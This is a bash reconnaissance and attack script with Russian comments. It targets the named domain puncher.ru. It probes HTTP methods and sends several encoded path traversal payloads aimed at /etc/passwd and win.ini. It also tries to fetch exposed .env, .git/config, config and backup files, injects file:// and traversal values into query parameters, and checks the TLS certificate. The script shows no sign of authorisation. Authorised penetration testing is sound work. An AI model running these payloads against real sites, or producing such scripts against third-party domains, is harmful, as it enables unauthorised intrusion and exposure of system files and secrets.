#!/bin/bash
DOMAIN="puncher.ru"
BASE_URL="https://$DOMAIN/"

echo "=== Тестирование безопасности $DOMAIN ==="
echo "Цель: $BASE_URL"
echo "Время: $(date)"
echo

# 1. Базовая проверка доступности
echo "1. ПРОВЕРКА ДОСТУПНОСТИ:"
curl -I $BASE_URL
echo "----------------------------------------"
echo

# 2. Детальный анализ заголовков
echo "2. АНАЛИЗ ЗАГОЛОВКОВ БЕЗОПАСНОСТИ:"
curl -s -I $BASE_URL | grep -i -E "server|x-powered-by|x-frame-options|csp|hsts|content-type|x-content-type-options|referrer-policy"
echo "----------------------------------------"
echo

# 3. Тестирование HTTP методов
echo "3. ТЕСТИРОВАНИЕ HTTP МЕТОДОВ:"
methods=("GET" "POST" "PUT" "DELETE" "PATCH" "OPTIONS" "HEAD" "TRACE" "CONNECT")
for method in "${methods[@]}"; do
    echo -n "$method: "
    status=$(curl -X $method -s -o /dev/null -w "%{http_code}" $BASE_URL)
    size=$(curl -X $method -s -o /dev/null -w "%{size_download}" $BASE_URL)
    echo "Status: $status, Size: $size"
    
    if [ "$status" == "200" ] && [ "$size" -gt 100 ]; then
        echo "*** ВОЗМОЖНО УЯЗВИМО: Метод $method возвращает контент!"
        curl -X $method -s $BASE_URL | head -n 5
    fi
done
echo "----------------------------------------"
echo

# 4. Path Traversal тесты
echo "4. ТЕСТИРОВАНИЕ PATH TRAVERSAL:"
traversal_paths=(
    "../../../etc/passwd"
    "..%2f..%2f..%2fetc%2fpasswd"
    "....//....//....//etc//passwd"
    "%2e%2e/%2e%2e/%2e%2e/etc/passwd"
    "..%252f..%252f..%252fetc%252fpasswd"
    "../../../windows/win.ini"
    "..%2f..%2f..%2fwindows%2fwin.ini"
)

for path in "${traversal_paths[@]}"; do
    echo -n "Тест $path: "
    status=$(curl -s -o /dev/null -w "%{http_code}" "$BASE_URL$path")
    size=$(curl -s -o /dev/null -w "%{size_download}" "$BASE_URL$path")
    echo "Status: $status, Size: $size"
    
    if [ "$status" == "200" ] && [ "$size" -gt 0 ]; then
        echo "*** ВОЗМОЖНА УЯЗВИМОСТЬ PATH TRAVERSAL!"
        curl -s "$BASE_URL$path" | head -n 3
    fi
done
echo "----------------------------------------"
echo

# 5. Поиск скрытых файлов и директорий
echo "5. ПОИСК СКРЫТЫХ РЕСУРСОВ:"
hidden_files=(
    ".env" ".htaccess" ".git/config" ".DS_Store"
    "config.php" "config.json" "config.yml" "settings.py"
    "backup.sql" "backup.zip" "backup.tar.gz"
    "debug" "test" "admin" "api" "upload" "download"
    "index.html" "index.php" "main.py" "app.js"
    "phpinfo.php" "info.php" "test.php"
    "robots.txt" "sitemap.xml" "crossdomain.xml"
)

for file in "${hidden_files[@]}"; do
    url="https://$DOMAIN/gate/$file"
    echo -n "Проверка $file: "
    status=$(curl -s -o /dev/null -w "%{http_code}" "$url")
    size=$(curl -s -o /dev/null -w "%{size_download}" "$url")
    echo "Status: $status, Size: $size"
    
    if [ "$status" == "200" ] && [ "$size" -gt 0 ]; then
        echo "*** НАЙДЕН ДОСТУПНЫЙ ФАЙЛ: $file"
        curl -s "$url" | head -n 2
    fi
done
echo "----------------------------------------"
echo

# 6. Тестирование параметров (если есть)
echo "6. ТЕСТИРОВАНИЕ ПАРАМЕТРОВ:"
test_params=(
    "?file=../../etc/passwd"
    "?page=../../../etc/passwd"
    "?path=....//....//etc/passwd"
    "?url=file:///etc/passwd"
    "?debug=true"
    "?test=1"
    "?admin=1"
)

for param in "${test_params[@]}"; do
    echo -n "Тест $param: "
    status=$(curl -s -o /dev/null -w "%{http_code}" "$BASE_URL$param")
    echo "Status: $status"
done
echo "----------------------------------------"
echo

# 7. Проверка корневой директории
echo "7. ПРОВЕРКА КОРНЕВОЙ ДИРЕКТОРИИ:"
curl -I "https://$DOMAIN/"
echo "----------------------------------------"
echo

# 8. Анализ SSL/TLS
echo "8. ПРОВЕРКА SSL СЕРТИФИКАТА:"
openssl s_client -connect $DOMAIN:443 -servername $DOMAIN < /dev/null 2>/dev/null | openssl x509 -noout -subject -dates
echo "----------------------------------------"
echo

echo "ТЕСТИРОВАНИЕ ЗАВЕРШЕНО"
